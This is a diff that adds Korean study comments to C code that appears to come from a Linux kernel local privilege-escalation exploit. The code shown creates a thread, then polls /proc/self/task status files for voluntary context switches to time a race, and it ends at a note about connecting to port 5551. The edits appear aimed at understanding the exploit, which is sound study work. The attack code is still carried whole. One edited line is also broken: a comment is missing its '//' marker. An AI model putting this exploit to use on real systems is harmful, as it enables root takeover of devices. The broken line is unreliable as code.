@@ -374,7 +374,7 @@ void write_kernel(int signum)
     return;
 }
 
-// 시그날 action을 설정하는 함수.
+// 시그날 action을 설정하는 쓰에드 함수.
 void *make_action(void *arg) {
     int prio;
     struct sigaction act;
@@ -425,15 +425,21 @@ pid_t wake_actionthread(int prio) {
     do_dm_tid_read = 0;
     did_dm_tid_read = 0;
 
+
     pthread_mutex_lock(&is_thread_desched_lock);
-    pthread_create(&th4, 0, make_action, (void *)prio);
-    pthread_cond_wait(&is_thread_desched, &is_thread_desched_lock);
 
-    pid = last_tid;
+    pthread_create(&th4, 0, make_action, (void *)prio); // make_action 쓰레드 생성.
+    
+	pthread_cond_wait(&is_thread_desched, &is_thread_desched_lock);
 
+    pid = last_tid; pid = 마지막 tid(last_tid)
+
+	// filename = 태스크 상태 파일명 설정.
     sprintf(filename, "/proc/self/task/%d/status", pid);
 
+	// 태스크 상태 오픈.
     fp = fopen(filename, "rb");
+
     if (fp == 0) {
         vcscnt = -1;
     }
@@ -441,24 +447,28 @@ pid_t wake_actionthread(int prio) {
         fread(filebuf, 1, sizeof filebuf, fp);
         pdest = strstr(filebuf, "voluntary_ctxt_switches");
         pdest += 0x19;
+		// vcscnt = voluntary_ctx_switches+0x19 오프셋 값 읽음.
         vcscnt = atoi(pdest);
         fclose(fp);
     }
 
     //sync with the action thread to find a voluntary ctxt switch
+	// voluntary ctxt switch를 액션 쓰레드가 찾는데 필요한 싱크.(동기화).
     while (do_dm_tid_read == 0) {
         usleep(10);
     }
 
+	// tid_read가 실행되었다고 설정.
     did_dm_tid_read = 1;
 
     while (1) {
-        sprintf(filename, "/proc/self/task/%d/status", pid);
+        sprintf(filename, "/proc/self/task/%d/status", pid); // 태스크 상태 오픈.
         fp = fopen(filename, "rb");
+
         if (fp == 0) {
             vcscnt2 = -1;
         }
-        else {
+        else { // 열리면 vcscnt2 읽음.
             fread(filebuf, 1, sizeof filebuf, fp);
             pdest = strstr(filebuf, "voluntary_ctxt_switches");
             pdest += 0x19;
@@ -466,7 +476,7 @@ pid_t wake_actionthread(int prio) {
             fclose(fp);
         }
 
-        if (vcscnt2 == vcscnt + 1) {
+        if (vcscnt2 == vcscnt + 1) { // vcscnt2 가 vcscnt+1과 같으면 코드 브레이크.
             break;
         }
         usleep(10);
@@ -475,7 +485,7 @@ pid_t wake_actionthread(int prio) {
 
     pthread_mutex_unlock(&is_thread_desched_lock);
 
-    return pid;
+    return pid; // last_tid 즉 pid 변수 리턴.
 }
 
 //connect to :5551 and set the SNDBUF=1
